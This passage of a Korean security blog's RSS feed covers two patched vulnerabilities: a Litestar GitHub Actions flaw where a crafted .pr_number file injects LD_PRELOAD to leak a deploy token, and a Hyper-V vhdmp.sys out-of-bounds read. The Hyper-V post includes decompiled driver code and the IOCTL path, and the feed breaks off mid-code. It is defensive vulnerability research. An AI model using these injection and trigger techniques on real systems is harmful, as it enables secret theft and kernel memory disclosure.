&#xC704;&#xC640; &#xAC19;&#xC774; <code>.pr_number</code> &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC744; &#xC791;&#xC131;&#xD560; &#xACBD;&#xC6B0; <code>PR_NUMBER</code> , <code>LD_PRELOAD</code> &#xB450; &#xAC1C;&#xC758; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; <code>LD_PRELOAD</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">docs</span> <span class="hljs-string">preview</span>  <span class="hljs-attr">uses:</span> <span class="hljs-string">JamesIves/github-pages-deploy-action@v4</span>  <span class="hljs-attr">with:</span>    <span class="hljs-attr">folder:</span> <span class="hljs-string">docs-preview/docs/_build/html</span>    <span class="hljs-attr">token:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.DOCS_PREVIEW_DEPLOY_TOKEN</span> <span class="hljs-string">}}</span>    <span class="hljs-attr">repository-name:</span> <span class="hljs-string">litestar-org/litestar-docs-preview</span>    <span class="hljs-attr">clean:</span> <span class="hljs-literal">false</span>    <span class="hljs-attr">target-folder:</span> <span class="hljs-string">${{</span> <span class="hljs-string">env.PR_NUMBER</span> <span class="hljs-string">}}</span>    <span class="hljs-attr">branch:</span> <span class="hljs-string">gh-pages</span></code></pre><p>&#xC774;&#xD6C4; <code>docs-preview</code>&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>JamesIves/github-pages-deploy-action</code> Actions&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; node &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs vim">Issue<span class="hljs-variable">s:</span> <span class="hljs-keyword">write</span>Metadat<span class="hljs-variable">a:</span> <span class="hljs-keyword">read</span>PullRequest<span class="hljs-variable">s:</span> <span class="hljs-keyword">write</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xACE0;, <code>DOCS_PREVIEW_DEPLOY_TOKEN</code> &#xD1A0;&#xD070; &#xC815;&#xBCF4;&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/09/18/ogu123/cve-2024-42370/image.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC815;&#xADDC; &#xD45C;&#xD604;&#xC2DD;&#xC744; &#xD1B5;&#xD574; <code>.pr_number</code>&#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xC22B;&#xC790;&#xC778;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xB3C4;&#xB85D; <a href="https://github.com/litestar-org/litestar/blob/main/.github/workflows/docs-preview.yml">&#xD328;&#xCE58;</a>&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42370">https://nvd.nist.gov/vuln/detail/CVE-2024-42370</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Litestar/">Litestar</category>
      
      <category domain="https://hackyboiz.github.io/tags/Environment-Variable-Injection/">Environment Variable Injection</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hyper-V 1-day Class: CVE-2024-38127</title>
      <link>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/</link>
      <guid>https://hackyboiz.github.io/2024/09/15/pwndorei/hyperv-1dayclass_CVE-2024-38127/</guid>
      <pubDate>Sun, 15 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xC5B4;&#xAE40;&#xC5C6;&#xC774; Hyper-V 1-day &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xB2EC;&#xC5D0; &#xB098;&#xC628; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2C8;&#xACE0; &#xC800;&#xBC88; &#xB2EC;&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; CVE-2024-38127&#xC774;&#xB780; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xB2EC;&#xC5D0;&#xB3C4; DoS &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD558;&#xB098; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xB358;&#xB370; &#xC2DC;&#xAC04;&#xC774; &#xB41C;&#xB2E4;&#xBA74; &#xADF8;&#xAC70;&#xB3C4; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;.</p><h1 id="CVE-2024-38127"><a href="#CVE-2024-38127" class="headerlink" title="CVE-2024-38127"></a>CVE-2024-38127</h1><ul><li>Impact: Elevation of Privilege</li><li>Max Severity: Important</li><li>Weakness: CWE-126(Buffer Over-read)</li><li>poc: <a href="https://github.com/pwndorei/CVE-2024-38127">https://github.com/pwndorei/CVE-2024-38127</a></li></ul><h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul><li>Windows 10 Version 1607 for x64-based Systems &lt; 10.0.14393.7259</li><li>Windows 11 Version 24H2 for x64-based Systems &lt; 10.0.26100.1457</li><li>Windows 10 for x64-based Systems &lt; 10.0.10240.20751</li><li>Windows 11 Version 23H2 for x64-based Systems &lt; 10.0.22631.4037</li><li>Windows 11 Version 23H2 for ARM64-based Systems &lt; 10.0.22631.4037</li><li>Windows 10 Version 22H2 for x64-based Systems &lt; 10.0.19045.4780</li><li>Windows 11 Version 22H2 for x64-based Systems &lt; 10.0.22621.4037</li><li>Windows 11 Version 22H2 for ARM64-based Systems &lt; 10.0.22621.4037</li><li>Windows 10 Version 21H2 for x64-based Systems &lt; 10.0.19044.4780</li><li>Windows 11 version 21H2 for ARM64-based Systems &lt; 10.0.22000.3147</li><li>Windows 11 version 21H2 for x64-based Systems &lt; 10.0.22000.3147</li><li>Windows 10 Version 1809 for x64-based Systems &lt; 10.0.17763.6189</li><li>&#x2026;</li></ul><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2024-38127&#xC740; Hyper-V&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD55C; &#xACBD;&#xC6B0; &#xACF5;&#xACA9;&#xC790;&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Weakness(CWE-126)&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; OOB Read&#xC774;&#xACE0; Microsoft&#xAC00; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38127">&#xACF5;&#xAC1C;&#xD55C; &#xC815;&#xBCF4;</a>&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xBD24;&#xC744; &#xB54C; &#xC2E4;&#xC81C;&#xB85C; EoP &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;&#xB294; &#xBCF4;&#xAE30; &#xD798;&#xB4E4; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Patch-Diffing"><a href="#Patch-Diffing" class="headerlink" title="Patch Diffing"></a>Patch Diffing</h2><p>patch diffing&#xC5D0;&#xB294; Windows 11 22H2 &#xD658;&#xACBD;&#xC5D0;&#xC11C; 2024&#xB144; 7&#xC6D4;(KB5040442)&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB41C; 2024&#xB144; 8&#xC6D4;(KB5041585) &#xD328;&#xCE58;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0;&#xB3C4; Patch-V&#xB85C; &#xAD00;&#xB828; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xCD94;&#xCD9C; &#xBC0F; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD588;&#xACE0; &#xC9C0;&#xB09C; CVE-2024-38080&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB294; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;(.sys)&#xB97C; &#xC9D1;&#xC911;&#xC801;&#xC73C;&#xB85C; diffing&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; vhdmp.sys&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xACE0; &#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC774;&#xB984;(Virtual Hard Disk Mini Port)&#xCC98;&#xB7FC; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC640; &#xC5F0;&#xAD00;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC544;&#xB798;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD55C; <code>VhdmpiQueryMetaData</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-3672"><a href="#VhdmpiQueryMetaData-vhdmp-sys-10-0-22621-3672" class="headerlink" title="VhdmpiQueryMetaData (vhdmp.sys 10.0.22621.3672)"></a><code>VhdmpiQueryMetaData</code> (vhdmp.sys 10.0.22621.3672)</h2><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiQueryMetadata</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        struct _VHD_HANDLE_CONTEXT *a1,</span></span><span class="hljs-function"><span class="hljs-params">        struct _VHD_VIRTUAL_DISK *a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 SystemBuffer,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *OutputBufferLengthPtr)</span></span><span class="hljs-function"></span>{...  v5 = *((_QWORD *)a2 + <span class="hljs-number">18</span>);  v41 = <span class="hljs-number">0</span>;  VhdmpiAcquirePassiveLock(v5 + <span class="hljs-number">1120</span>);  <span class="hljs-keyword">if</span> ( !SystemBuffer )    <span class="hljs-keyword">goto</span> LABEL_86;  v10 = OutputBufferLengthPtr;  <span class="hljs-keyword">if</span> ( !OutputBufferLengthPtr )    <span class="hljs-keyword">goto</span> LABEL_86;  OutputBufferLength = *OutputBufferLengthPtr;  v12 = <span class="hljs-number">32</span>;  <span class="hljs-keyword">if</span> ( *OutputBufferLengthPtr &lt; <span class="hljs-number">0x20</span> )    <span class="hljs-keyword">goto</span> LABEL_86;  *(_OWORD *)SystemBuffer = <span class="hljs-number">0</span>i64;  *(_OWORD *)(SystemBuffer + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>i64;  v13 = *(_QWORD *)v5;  <span class="hljs-keyword">if</span> ( *(<span class="hljs-keyword">char</span> ***)v5 != &amp;IsoParser )  {    <span class="hljs-keyword">if</span> ( a3 &gt; <span class="hljs-number">0x3E8</span> )      <span class="hljs-keyword">goto</span> LABEL_86;    <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1000</span> )    {      *(_DWORD *)SystemBuffer = <span class="hljs-number">1000</span>;      VhdmpiVirtualDiskToInstanceId((__int64)a2, (_OWORD *)(SystemBuffer + <span class="hljs-number">8</span>));      <span class="hljs-keyword">goto</span> LABEL_18;    }    <span class="hljs-keyword">if</span> ( a3 &lt;= <span class="hljs-number">8</span> )    {      ...      <span class="hljs-keyword">if</span> ( a3 )      {        <span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1</span> )        {          *(_DWORD *)SystemBuffer = <span class="hljs-number">1</span>;          (*(<span class="hljs-keyword">void</span> (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + <span class="hljs-number">216</span>i64))(v5, SystemBuffer + <span class="hljs-number">8</span>);          <span class="hljs-keyword">goto</span> LABEL_25;        }        <span class="hljs-keyword">if</span> ( a3 != <span class="hljs-number">2</span> )        {          <span class="hljs-keyword">switch</span> ( a3 )          {            ...            <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:                            <span class="hljs-comment">//[1]</span>              v24 = *(<span class="hljs-keyword">unsigned</span> __int16 *)(v5 + <span class="hljs-number">88</span>);              *(_DWORD *)SystemBuffer = <span class="hljs-number">5</span>;LABEL_54:              OutputLength = v24 + <span class="hljs-number">0x22</span>;<span class="hljs-comment">//[2]</span>              <span class="hljs-keyword">if</span> ( OutputBufferLength &gt;= (<span class="hljs-keyword">int</span>)v24 + <span class="hljs-number">0x22</span> )              {                *(_DWORD *)(SystemBuffer + <span class="hljs-number">12</span>) = v24 + <span class="hljs-number">2</span>;                v26 = (<span class="hljs-keyword">void</span> *)(SystemBuffer + <span class="hljs-number">16</span>);                *(_BYTE *)(SystemBuffer + <span class="hljs-number">8</span>) = <span class="hljs-number">1</span>;                v27 = v24;                memmove(v26, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(v5 + <span class="hljs-number">96</span>), v24);<span class="hljs-comment">//[3]</span>                *((_WORD *)v26 + (v27 &gt;&gt; <span class="hljs-number">1</span>)) = <span class="hljs-number">0</span>;              }              *v10 = OutputLength;<span class="hljs-comment">//[4], v10 == OutputBufferLengthPtr</span>              <span class="hljs-keyword">goto</span> LABEL_26;            ...          }...}</code></pre><p>&#xC704; &#xD568;&#xC218;&#xB294; &#xC774;&#xB984;&#xCC98;&#xB7FC; &#xAC00;&#xC0C1; &#xD558;&#xB4DC; &#xB514;&#xC2A4;&#xD06C;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xCFFC;&#xB9AC;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xBA70; <code>DeviceIoControl</code>&#xC744; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xC758; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>a3</code>&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xCCAB; 4&#xBC14;&#xC774;&#xD2B8; &#xAC12;&#xC73C;&#xB85C; <code>if</code> &#xBB38;&#xC774;&#xB098; <code>switch-case</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xB3D9;&#xC791;(&#xC5B4;&#xB5A4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xCFFC;&#xB9AC;&#xD560;&#xC9C0; &#xB4F1;)&#xC744; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xD568;&#xC218;&#xC758; &#xB124; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>SystemBuffer</code>&#xB294; &#xBCC0;&#xC218;&#xBA85;&#xCC98;&#xB7FC; IRP&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xB85C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xB294; &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xC5D0; &#xBCF5;&#xC0AC;&#xB418;&#xC5B4; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xC758; &#xB2E4;&#xC12F; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>OutputBufferLengthPtr</code>&#xB294; IRP&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;(&#xCEE4;&#xB110;&#xACF5;&#xAC04;)&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xACF5;&#xAC04; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xB420; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>a3</code>&#xC774; 5&#xC77C; &#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; [1]&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; [2]&#xC5D0;&#xC11C; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; <code>OutputLength</code> &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;(<code>OutputBufferLength</code>)&#xC640; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;(<code>OutputLength</code>)&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xB370; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xB354; &#xC791;&#xB2E4;&#xBA74; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xBD80;&#xC871;&#xD55C; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>if</code> &#xBB38; &#xB0B4;&#xBD80;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB370;&#xC774;&#xD130; &#xBCF5;&#xC0AC;&#xB97C; &#xC704;&#xD55C; <code>memmove</code>([3])&#xB3C4; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; <code>if</code> &#xBB38; &#xB0B4;&#xBD80;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; [4]&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xB420; &#xD06C;&#xAE30;&#xAC00; &#xBA54;&#xD0C0; &#xB370;&#xC774;&#xD130;&#xC758; &#xAE38;&#xC774;(<code>OutputLength</code>)&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070; &#xAC12;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB85C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB420; &#xB54C; &#xC2DC;&#xC2A4;&#xD15C; &#xBC84;&#xD37C;&#xC640; &#xC778;&#xC811;&#xD55C; non paged pool &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; OOB Read&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof-of-Concept"></a>Proof-of-Concept</h1><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>VhdmpiQueryMetaData</code> &#xD568;&#xC218;&#xB294; &#xC544;&#xB798;&#xC758; <code>VhdmpiGetMetaInformation</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; [4]&#xB97C; &#xBCF4;&#xBA74; <code>OutputBufferLength</code>&#xC758; &#xAC12;&#xC774; <code>irp&#x2192;IoStatus.Information</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C; &#xB2E4;&#xB8EC; &#xAC83;&#xCC98;&#xB7FC; &#xC774;&#xB85C; &#xC778;&#xD574; OOB Read&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiGetMetaInformation</span><span class="hljs-params">(struct _VHD_HANDLE_CONTEXT *a1, struct _IRP *irp)</span></span><span class="hljs-function"></span>{  ...  v6 = VhdmpiValidateMetadataAccessForHandle(a1, <span class="hljs-number">1</span>);  <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">0</span> )  {    ...    <span class="hljs-keyword">else</span>                                            {      SystemBuffer = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)irp-&gt;AssociatedIrp.SystemBuffer;      OutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;      v6 = VhdmpiQueryMetadata(             a1,             (struct _VHD_VIRTUAL_DISK *)v7,             *SystemBuffer,             (__int64)SystemBuffer,             &amp;OutputBufferLength);      <span class="hljs-keyword">if</span> ( v6 &lt; <span class="hljs-number">0</span> )      {        ...      }      <span class="hljs-keyword">else</span>      {        v6 = <span class="hljs-number">0</span>;        irp-&gt;IoStatus.Information = OutputBufferLength;<span class="hljs-comment">//[4]</span>      }    }    VhdmpiReleasePassiveLockShared(v8);  }  <span class="hljs-keyword">if</span> ( v6 &lt; <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> LABEL_15;  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v6;}</code></pre><p>&#xC704; &#xD568;&#xC218;&#xB294; <code>VhdmpiIsoControlObjectDeviceControlHandler</code> &#xD568;&#xC218;&#xB098; &#xC544;&#xB798;&#xC758; <code>VhdmpiVhdControlObjectDeviceControlHandler</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294;&#xB370; <code>VhdmpiVhdControlObjectDeviceControlHandler</code>&#xC5D0;&#xC11C;&#xB294; IoControlCode&#xAC00; 0x2D1940&#xC77C; &#xB54C; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">VhdmpiVhdControlObjectDeviceControlHandler</span><span class="hljs-params">(struct _VHD_HANDLE_CONTEXT *a1, struct _IRP *irp)</span></span><span class="hljs-function"></span>{  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;  IoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="hljs-keyword">if</span> ( !*((_QWORD *)a1 + <span class="hljs-number">38</span>) )    <span class="hljs-keyword">goto</span> LABEL_3;  v21 = *((_DWORD *)a1 + <span class="hljs-number">1</span>);  <span class="hljs-keyword">if</span> ( (v21 &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )  {    <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x2D1A54</span> )      <span class="hljs-keyword">goto</span> LABEL_217;LABEL_38:    InternalScsiAddress = <span class="hljs-number">-1073741811</span>;    <span class="hljs-keyword">goto</span> LABEL_16;  }  <span class="hljs-keyword">if</span> ( (v21 &amp; <span class="hljs-number">0x800</span>) != <span class="hljs-number">0</span> )  {    ...  }  <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D19C6</span> )  {    ...    <span class="hljs-keyword">else</span>    {      <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x2D197C</span> )        <span class="hljs-keyword">goto</span> LABEL_146;      <span class="hljs-keyword">if</span> ( IoControlCode == <span class="hljs-number">0x41018</span>        || IoControlCode == <span class="hljs-number">0x2D191C</span>        || IoControlCode == <span class="hljs-number">2955552</span>        || IoControlCode == <span class="hljs-number">2955568</span>        || IoControlCode == <span class="hljs-number">2955572</span>        || IoControlCode == <span class="hljs-number">2955584</span>        || IoControlCode == <span class="hljs-number">2955588</span>        || IoControlCode == <span class="hljs-number">2955592</span>        || IoControlCode == <span class="hljs-number">2955600</span> )      {LABEL_18:        <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D1960</span> )        {          <span class="hljs-keyword">if</span> ( IoControlCode != <span class="hljs-number">0x2D1960</span> )          {            <span class="hljs-keyword">if</span> ( IoControlCode &lt;= <span class="hljs-number">0x2D1944</span> )            {              <span class="hljs-keyword">if</span> ( IoControlCode != <span class="hljs-number">0x2D1944</span> )              {                v15 = IoControlCode - <span class="hljs-number">0x41018</span>;                <span class="hljs-keyword">if</span> ( !v15 )                {                  ...                v16 = v15 - <span class="hljs-number">0x290904</span>;                <span class="hljs-keyword">if</span> ( !v16 )                     <span class="hljs-comment">// IoControlCode == 0x2d191c</span>                {                  ...                }                v17 = v16 - <span class="hljs-number">4</span>;                <span class="hljs-keyword">if</span> ( !v17 )                     <span class="hljs-comment">// IoControlCode == 0x2d1918</span>                {                  ...                }                v18 = v17 - <span class="hljs-number">4</span>;                <span 